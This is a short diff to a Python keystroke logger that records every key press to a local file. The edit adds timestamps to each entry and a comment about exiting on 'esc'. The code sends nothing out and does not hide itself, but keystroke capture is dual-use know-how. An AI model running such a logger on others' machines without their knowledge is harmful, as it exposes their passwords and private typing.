@@ -16,7 +16,7 @@ def onKeyboardEvent(event):
     try:
         with open(log_file, 'a') as file:
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            file.write('{}\n'.format(event.name))
+            file.write('{} - {}\n'.format(timestamp,event.name))
     except Exception as e:
         print("Error encountered: {}".format(e))
 
@@ -32,7 +32,7 @@ def main(log_file):
     try:
         # Set up the keyboard event listener
         keyboard.on_press(onKeyboardEvent)
-        keyboard.wait('esc')
+        keyboard.wait('esc') # exit on 'esc' key pressed
     except KeyboardInterrupt:
         print("\nLogging stopped.")
     except Exception as e:
